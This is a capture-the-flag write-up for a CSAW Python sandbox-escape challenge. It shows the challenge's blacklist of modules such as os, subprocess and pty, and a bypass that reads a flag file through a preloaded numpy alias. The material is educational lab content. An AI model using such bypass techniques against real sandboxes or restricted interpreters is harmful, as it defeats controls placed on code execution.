# pwn / slithery

## Question

> Setting up a new coding environment for my data science students.
> Some of them are l33t h4ck3rs that got RCE and crashed my machine a few times :(.
> Can you help test this before I use it for my class?
> Two sandboxes should be better than one...
>
> `nc pwn.chal.csaw.io 5011`

### Provided Files

- `sandbox.py`

## Solution

The `sandbox.py` file spawns up a restricted Python REPL loop.

```py
#!/usr/bin/env python3
from base64 import b64decode
import blacklist  # you don't get to see this :p

"""
Don't worry, if you break out of this one, we have another one underneath so that you won't
wreak any havoc!
"""

def main():
    print("EduPy 3.8.2")
    while True:
        try:
            command = input(">>> ")
            if any([x in command for x in blacklist.BLACKLIST]):
                raise Exception("not allowed!!")

            final_cmd = """
uOaoBPLLRN = open("sandbox.py", "r")
uDwjTIgNRU = int(((54 * 8) / 16) * (1/3) - 8)
ORppRjAVZL = uOaoBPLLRN.readlines()[uDwjTIgNRU].strip().split(" ")
AAnBLJqtRv = ORppRjAVZL[uDwjTIgNRU]
bAfGdqzzpg = ORppRjAVZL[-uDwjTIgNRU]
uOaoBPLLRN.close()
HrjYMvtxwA = getattr(__import__(AAnBLJqtRv), bAfGdqzzpg)
RMbPOQHCzt = __builtins__.__dict__[HrjYMvtxwA(b'X19pbXBvcnRfXw==').decode('utf-8')](HrjYMvtxwA(b'bnVtcHk=').decode('utf-8'))\n""" + command
            exec(final_cmd)

        except (KeyboardInterrupt, EOFError):
            return 0
        except Exception as e:
            print(f"Exception: {e}")

if __name__ == "__main__":
    exit(main())
```

From analyzing the code, we notice a `blacklist`.
We can dump out that blacklist since it is in scope inside `exec`:

```text
EduPy 3.8.2
>>> print(blacklist.BLACKLIST)
['__builtins__', '__import__', 'eval', 'exec', 'import', 'from', 'os', 'sys', 'system', 'timeit', 'base64commands', 'subprocess', 'pty', 'platform', 'open', 'read', 'write', 'dir', 'type']
```

We can't import anything new (like `os`), but we can work with what's already imported.
Breaking down the obfuscated code, it actually just imports `numpy`:

```py
# load the sandbox file
uOaoBPLLRN = open("sandbox.py", "r")
# this evaluates to 1
uDwjTIgNRU = int(((54 * 8) / 16) * (1/3) - 8)
# fetches the first line of code from the sandbox file
ORppRjAVZL = uOaoBPLLRN.readlines()[uDwjTIgNRU].strip().split(" ")
# selects words[1] and words[-1], or "base64" and "b64decode", respectively
AAnBLJqtRv = ORppRjAVZL[uDwjTIgNRU]
bAfGdqzzpg = ORppRjAVZL[-uDwjTIgNRU]
uOaoBPLLRN.close()
# from base64 import b64decode
HrjYMvtxwA = getattr(__import__(AAnBLJqtRv), bAfGdqzzpg)
# __import__('numpy')
RMbPOQHCzt = __builtins__.__dict__[HrjYMvtxwA(b'X19pbXBvcnRfXw==').decode('utf-8')](HrjYMvtxwA(b'bnVtcHk=').decode('utf-8'))
```

Knowing that `numpy` is in scope as `RMbPOQHCzt`, we can read around for the flag file.
`numpy.loadtxt` allows reading CSV-like files.
Setting the delimiter to something random allows for the entire file to be read as a string.

```text
EduPy 3.8.2
>>> print(RMbPOQHCzt.loadtxt("flag.txt",str,delimiter="AAAAA"))
flag{y4_sl1th3r3d_0ut}
```

### Flag

`flag{y4_sl1th3r3d_0ut}`
